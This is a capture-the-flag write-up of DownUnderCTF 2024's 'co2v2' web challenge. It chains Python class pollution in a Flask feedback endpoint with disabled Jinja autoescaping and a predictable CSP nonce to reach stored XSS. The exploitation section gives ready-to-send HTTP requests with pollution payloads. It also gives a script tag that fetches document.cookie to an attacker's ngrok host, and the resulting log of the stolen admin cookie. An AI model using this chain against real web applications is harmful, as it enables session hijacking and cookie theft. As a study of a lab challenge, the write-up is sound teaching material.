# co2v2

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 59 solves / 222 points
- Author: @n00b.master.
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

Well the last time they made a big mistake with the flag endpoint, now we don't even have it anymore. It's time for a second pentest for some new functionality they have been working on.

Author: n00b.master.

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162816.png)

In here, we can see that there's a button to report a problem on this page, and an admin will check out the page for any problems.

Let's create a new account and login!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162931.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162942.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709162957.png)

After logging in, just like the "co2" challenge, we can go to the "Dashboard" page to create/read our new blog posts, "Profile" page to view our username, and "Feedback" page to submit feedback.

In the previous "co2" challenge (Writeup [here](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/co2/README.md)), there's a Python class pollution vulnerability in the POST `/save_feedback` route, maybe it's still vulnerable this time?

Let's read this challenge's source code in order to figure out what's this challenge goal.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/co2v2/co2v2.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2v2)-[2024.07.09|16:33:02(HKT)]
└> file co2v2.zip 
co2v2.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2v2)-[2024.07.09|16:33:03(HKT)]
└> unzip co2v2.zip 
Archive:  co2v2.zip
   creating: co2v2/
   creating: co2v2/src/
  inflating: co2v2/src/.flaskenv     
  inflating: co2v2/src/Dockerfile    
   creating: co2v2/src/feedback/
  inflating: co2v2/src/feedback/feedback_1718806693.txt  
  inflating: co2v2/src/feedback/feedback_1718806613.txt  
  inflating: co2v2/src/feedback/feedback_1718806654.txt  
  inflating: co2v2/src/feedback/feedback_1718806573.txt  
  inflating: co2v2/src/feedback/feedback_1718806611.txt  
  inflating: co2v2/src/run.py        
   creating: co2v2/src/app/
  inflating: co2v2/src/app/utils.py  
   creating: co2v2/src/app/static/
   creating: co2v2/src/app/static/js/
  inflating: co2v2/src/app/static/js/submitFeedback.js  
   creating: co2v2/src/app/templates/
  inflating: co2v2/src/app/templates/dashboard.html  
  inflating: co2v2/src/app/templates/profile.html  
  inflating: co2v2/src/app/templates/create_post.html  
  inflating: co2v2/src/app/templates/blog.html  
  inflating: co2v2/src/app/templates/register.html  
  inflating: co2v2/src/app/templates/feedback.html  
  inflating: co2v2/src/app/templates/index.html  
  inflating: co2v2/src/app/templates/edit_blog.html  
  inflating: co2v2/src/app/templates/base.html  
  inflating: co2v2/src/app/templates/changelog.html  
  inflating: co2v2/src/app/templates/update_user.html  
  inflating: co2v2/src/app/templates/login.html  
 extracting: co2v2/src/app/.env      
  inflating: co2v2/src/app/models.py  
  inflating: co2v2/src/app/config.py  
  inflating: co2v2/src/app/__init__.py  
  inflating: co2v2/src/app/routes.py  
  inflating: co2v2/src/cookiejar     
 extracting: co2v2/src/.env          
  inflating: co2v2/src/requirements.txt  
  inflating: co2v2/docker-compose.yml  
```

After reviewing the source code, we can see some changes have been made.

First off, what's the objective of this challenge? Where's the flag?

**In `co2v2/src/cookiejar`, we can see that the flag is being stored in a cookie named `admin-cookie`:**
```json
[
  {
    "domain": "co2v2:1337",
    "name": "admin-cookie",
    "value": "DUCTF{testflag}",
    "httponly": false
  }
]
```

As you can see, the **`httpOnly` attribute is set to `false`**, which means if we find a client-side vulnerability, such as XSS (Cross-Site Scripting), we can use the **JavaScript API `document.cookie` to read the flag**.

Also, in `co2v2/docker-compose.yml`, we can see that there's **2 different Docker services will be running**:

```yaml
version: '3.3'

services:
  co2v2:
    container_name: co2v2
    build: src/
    links:
      - xssbot
    env_file:
      - './src/.env'
    ports:
      - "1337:1337"

  xssbot:
    image: ghcr.io/downunderctf/docker-vendor/xssbot:chrome
    privileged: true
    volumes:
      - ./src/cookiejar:/var/marvin/auth/cookiejar
    env_file:
      - './src/.env'
```

In service `xssbot`, it mounts the `cookiejar` file to its filesystem at `/var/marvin/auth/cookiejar`.

That being said, we'll need to somehow find a client-side vulnerability in order to get the flag.

> Note: Remote Code Execution is useless in this challenge, as the cookie is stored in Docker service `xssbot`, not `co2v2`.

Second, the previously found Python class pollution didn't get fixed, no sanitization at all:

**`co2v2/src/app/routes.py`:**
```python
from flask import request, url_for, jsonify, render_template, redirect, flash, g, current_app as app
from .utils import merge, save_feedback_to_disk, generate_random_string
[...]
# Not quite sure how many fields we want for this, lets just collect these bits now and increase them later. 
# Is it possible to dynamically add fields to this object based on the fields submitted by users?
class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""
[...]
@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200
```

**`co2v2/src/app/utils.py`:**
```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

Now, let's take a look at the "**Report Error**" button at the "Home" page.

In `co2v2/src/app/templates/index.html`, we can see that when we clicked the button, it'll send a GET request to `/api/v1/report` via jQuery:

```html
<button class="btn btn-info report">Report Error</button>
    <p><small>Report a problem on this page and an admin will check out the page for any problems</small></p>
  <script nonce="{{nonce}}">
    url = "/api/v1/report"
      $("button.report").click( function () {
        $.get(url, function(data, status){
          alert("Report was succesfully made.");
        })
      });
  </script>
```

In `co2v2/src/app/routes.py`, we can see this route's logic:

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
[...]
import os
[...]
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["60 per minute"]
)
[...]
@app.route("/api/v1/report")
@limiter.limit("6 per minute")
def report():
    resp = requests.post(f'{os.getenv("XSSBOT_URL", "http://xssbot:8000")}/visit', json={'url':
        os.getenv("APP_URL", "http://co2v2:1337")
    }, headers={
        'X-SSRF-Protection': '1'
    })
    print(resp.text)
    return jsonify(status=resp.status_code)
```

When we send a GET request to `/api/v1/report`, it'll send a POST request to service `xssbot` (`http://xssbot:8000`) with a JSON body data. In that data, there's a `url` attribute, and its value is `http://co2v2:1337`, which is the home page of the internal URL of the Flask web application.

With that said, we need to somehow **exploit a client-side vulnerability in the home page**.

Hmm... What about the home page route (`/`) logic?

```python
from .models import User, BlogPost
[...]
from jinja2 import Environment, select_autoescape, PackageLoader
[...]
TEMPLATES_ESCAPE_ALL = True
[...]
class jEnv():
    """Contains the default config for the Jinja environment. As we move towards adding more functionality this will serve as the object that will
    ensure the right environment is being loaded. The env can be updated when we slowly add in admin functionality to the application.
    """
    def __init__(self):
        self.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES_ESCAPE_ALL)

template_env = jEnv()
[...]
@app.route('/')
def index():
    posts = BlogPost.query.filter_by(is_public=True).all()
    template = template_env.env.get_template("index.html")    
    return template.render(posts=posts, current_user=current_user, nonce=g.nonce)
```

In here, we can see that the **public** blog posts are fetched from the database. Then, it uses Jinja template engine to render template `index.html`.

However, instead of just using `render_template` function, it creates a new Jinja environment. In the `Environment` class, we can see the `autoescape` attribute is set to variable `TEMPLATES_ESCAPE_ALL`, which is boolean value `True`.

According to [Jinja's official documentation](https://jinja.palletsprojects.com/en/3.1.x/api/#high-level-api), the `autoescape` attribute is to escape XML and HTML markup. By default, it's set to `False`.

Hmm... So no client-side vulnerability? Well, nope.

Remember, this web application is still vulnerable to Python class pollution vulnerability, so we can **pollute the `TEMPLATES_ESCAPE_ALL` variable to boolean value `False`** to achieve client-side vulnerability. More specifically, it's **stored XSS**.

**In the previous ["co2" challenge writeup](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/co2/README.md), we used a payload like this:**
```json
{
    "title":"literally_anything",
    "content":"literally_anything",
    "rating":"literally_anything",
    "referred":"literally_anything",
    "__init__":{
        "__globals__":{
            "flag": "true"
        }
    }
}
```

**We can do the exact same thing to variable `TEMPLATES_ESCAPE_ALL`!**
```json
{
    "title":"literally_anything",
    "content":"literally_anything",
    "rating":"literally_anything",
    "referred":"literally_anything",
    "__init__":{
        "__globals__":{
            "TEMPLATES_ESCAPE_ALL": false
        }
    }
}
```

But wait a minute, the Jinja environment won't get updated? Right?

**Unfortunately, there's a POST route at `/admin/update-accepted-templates` to update Jinja environment:**
```python
# Future Admin routes - FOR TEST ENVIRONMENT ONLY
@app.route("/admin/update-accepted-templates", methods=["POST"])
@login_required
def update_template():
    data = json.loads(request.data)
    # Enforce strict policy to filter all expressions
    if "policy" in data and data["policy"] == "strict":
        template_env.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES_ESCAPE_ALL)
    # elif "policy" in data and data["policy"] == "lax":
    #     template_env.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES_ESCAPE_NONE)
    # TO DO: Add more configurations for allowing LateX, XML etc. to be configured in app
    return jsonify({"success": "true"}), 200
```

If we pollute `TEMPLATES_ESCAPE_NONE` and then send a POST request to `/admin/update-accepted-templates` with JSON body data `{"policy":"strict"}`, the Jinja environment's `autoescape` will be updated to our polluted value `False`.

Nice! Now the web application should be vulnerable to stored XSS... Wait a minute, there's a CSP (Content Security Policy) to minimize the impact of XSS:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709174017.png)

If we go to [Google's CSP Evaluator](https://csp-evaluator.withgoogle.com/), we can see that the `script-src` directive can be bypassed via `ajax.googleapis.com`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709174152.png)

We could bypass the CSP `script-src` directive via `ajax.googleapis.com`. However, we could also take a look at the nonce generation:

```python
from .utils import merge, save_feedback_to_disk, generate_random_string
[...]
# Secret used to generate a nonce to be used with the CSP policy 
SECRET_NONCE = generate_random_string()
# Use a random amount of characters to append while generating nonce value to make it more secure
RANDOM_COUNT = random.randint(32,64)
[...]
def generate_nonce(data):
    nonce = SECRET_NONCE + data + generate_random_string(length=RANDOM_COUNT)
    sha256_hash = hashlib.sha256()
    sha256_hash.update(nonce.encode('utf-8'))
    hash_hex = sha256_hash.hexdigest()
    g.nonce = hash_hex
    return hash_hex

@app.before_request
def set_nonce():
    generate_nonce(request.path)

@app.after_request
def apply_csp(response):
    nonce = g.get('nonce')
    csp_policy = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' https://ajax.googleapis.com; "
        f"style-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "
        f"script-src-attr 'self' 'nonce-{nonce}'; " 
        f"connect-src *; "
    )
    response.headers['Content-Security-Policy'] = csp_policy
    return response
```

**`co2v2/src/app/utils.py`:**
```python
def generate_random_string(length=16):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string
```

As you can see, the nonce is SHA256 hashed, and the input is `SECRET_NONCE<request_path><random_strings_with_RANDOM_COUNT_length>`.

Ah ha! We can also **pollute the `SECRET_NONCE` to be a string of anything**, and **`RANDOM_COUNT` to be integer `0`**. By doing so, the SHA256 input is: `<anything_we_want><request_path><empty_string>`.

Nice! We now get a full-blown **stored XSS with CSP bypass via Python class pollution**!

## Exploitation

Putting everything together, we can get the flag via:

1. Exploit Python class pollution to pollute `TEMPLATES_ESCAPE_ALL = False`, `SECRET_NONCE = 'literally_anything'`, and `RANDOM_COUNT = 0` via POST route `/save_feedback`
2. Update Jinja environment's `autoescape` attribute via POST route `/admin/update-accepted-templates`
3. Create a new blog post with XSS payload, and make it public
4. Report to admin
5. Get the flag!

Let's do it!

- Python class pollution

```http
POST /save_feedback HTTP/2
Host: web-co2v2-bf232bafe3979c0d.2024.ductf.dev
Cookie: session=.eJwlzssNwjAMANBdcuZgx5_GLIPs2BFcW3pC7A6IAZ70Xu229jru7frcz7q02yPbtQUDuBAQ2cIhNeZin-aoPS20Wzh3FSzWDCjm6FwZPir77OghGT_i2JOQFGKA6BDQKU4EkTotS2aNTdl8MdbMZbWRbR6jfSPnUft_g-39Ad-_MBE.Zoz09Q.LpfMqtgQWdTNmul74tzeLx41pjU
Content-Length: 337
Content-Type: application/json

{
    "title":"literally_anything",
    "content":"literally_anything",
    "rating":"literally_anything",
    "referred":"literally_anything",
    "__init__":{
        "__globals__":{
            "TEMPLATES_ESCAPE_ALL": false,
            "SECRET_NONCE": "literally_anything",
            "RANDOM_COUNT": 0
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709175429.png)

- Update Jinja environment's `autoescape` attribute

```http
POST /admin/update-accepted-templates HTTP/2
Host: web-co2v2-bf232bafe3979c0d.2024.ductf.dev
Cookie: session=.eJwlzssNwjAMANBdcuZgx5_GLIPs2BFcW3pC7A6IAZ70Xu229jru7frcz7q02yPbtQUDuBAQ2cIhNeZin-aoPS20Wzh3FSzWDCjm6FwZPir77OghGT_i2JOQFGKA6BDQKU4EkTotS2aNTdl8MdbMZbWRbR6jfSPnUft_g-39Ad-_MBE.Zoz09Q.LpfMqtgQWdTNmul74tzeLx41pjU
Content-Type: application/json
Content-Length: 27

{
    "policy":"strict"
}
```

- Get a valid nonce for our XSS payload

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709175658.png)

Valid nonce in path `/`: **`abfbce049d9b88169854405a12885883f633e33bff53c00bea056033ec92d831`**

> Note: We can also manually calculate the SHA256 nonce.

- Setup a simple HTTP server for exfiltrating the admin's cookie

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2v2)-[2024.07.09|17:58:15(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2)-[2024.07.09|17:58:29(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://1c4f-{REDACTED}.ngrok-free.app -> http://localhost:80
[...]
```

- Create a new blog post with XSS payload, and make it public

**XSS payload:**
```html
<script nonce='abfbce049d9b88169854405a12885883f633e33bff53c00bea056033ec92d831'>fetch("https://1c4f-{REDACTED}.ngrok-free.app/?cookie="+document.cookie);</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180027.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180108.png)

- Report to admin

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180148.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180157.png)

- Get the flag

```shell
127.0.0.1 - - [09/Jul/2024 18:01:51] "GET /?cookie=admin-cookie=DUCTF{_1_d3cid3_wh4ts_esc4p3d_} HTTP/1.1" 200 -
```

Let's go!!!

- **Flag: `DUCTF{_1_d3cid3_wh4ts_esc4p3d_}`**

## Conclusion

What we've learned:

1. Stored XSS and CSP bypass via Python class pollution